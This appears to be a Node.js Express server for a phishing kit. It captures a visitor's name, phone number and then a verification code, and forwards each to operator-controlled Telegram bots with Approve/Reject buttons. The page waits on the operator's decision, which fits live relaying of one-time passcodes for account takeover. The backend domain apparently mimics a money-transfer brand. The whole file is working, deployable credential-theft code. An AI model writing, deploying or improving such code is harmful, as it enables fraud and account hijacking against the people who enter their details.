require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;

const BACKEND_DOMAIN = 'https://sendwave-9mid.onrender.com';

// ---------------- MEMORY ----------------
const phoneStatus = {};
const codeStatus = {};
const requestMap = {};

// ---------------- BOT LOAD ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (match) {
        const id = `bot${match[1]}`;
        const token = process.env[key];
        const chatId = process.env[`BOT${match[1]}_CHATID`];

        if (token && chatId) {
            bots.push({ botId: id, botToken: token, chatId });
        }
    }
});

app.use(express.json());
app.use(express.static('public'));

function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

// ---------------- TELEGRAM ----------------
async function sendTelegram(bot, payload) {
    await axios.post(
        `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
        {
            chat_id: bot.chatId,
            text: payload.text,
            reply_markup: payload.reply_markup
        }
    );
}

// ---------------- PHONE STEP ----------------
app.post('/submit-phone', async (req, res) => {
    const { name, phone, botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: "Invalid bot" });

    const requestId = uuidv4();
    phoneStatus[requestId] = null;

    requestMap[requestId] = { name, phone };

    await sendTelegram(bot, {
        text: `📱 PHONE REQUEST\n\nName: ${name}\nPhone: ${phone}`,
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: `approve:phone:${requestId}` },
                { text: '❌ Reject', callback_data: `reject:phone:${requestId}` }
            ]]
        }
    });

    res.json({ requestId });
});

app.get('/check-phone/:id', (req, res) => {
    res.json({ approved: phoneStatus[req.params.id] ?? null });
});

// ---------------- CODE STEP ----------------
app.post('/submit-code', async (req, res) => {
    const { code, botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: "Invalid bot" });

    const requestId = uuidv4();
    codeStatus[requestId] = null;

    await sendTelegram(bot, {
        text: `🔑 CODE REQUEST\n\nCode: ${code}`,
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: `approve:code:${requestId}` },
                { text: '❌ Reject', callback_data: `reject:code:${requestId}` }
            ]]
        }
    });

    res.json({ requestId });
});

app.get('/check-code/:id', (req, res) => {
    res.json({ approved: codeStatus[req.params.id] ?? null });
});

// ---------------- CALLBACK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const cb = req.body.callback_query;
if (!cb) return res.sendStatus(200);

console.log("CALLBACK RECEIVED:", cb.data);

const parts = cb.data.split(':');

const action = parts[0];
const type = parts[1];
const requestId = parts[2];

if (!action || !type || !requestId) {
    console.log("INVALID CALLBACK:", cb.data);
    return res.sendStatus(200);
}

if (type === 'phone') {
    phoneStatus[requestId] = (action === 'approve');
    console.log("PHONE STATUS UPDATED:", requestId, phoneStatus[requestId]);
}

if (type === 'code') {
    codeStatus[requestId] = (action === 'approve');
    console.log("CODE STATUS UPDATED:", requestId, codeStatus[requestId]);
}

try {
    await axios.post(
        `https://api.telegram.org/bot${getBot(req.params.botId).botToken}/answerCallbackQuery`,
        { callback_query_id: cb.id }
    );
} catch (e) {
    console.log("Callback answer error:", e.message);
}

res.sendStatus(200);
});

// ---------------- START ----------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on ${PORT}`);
});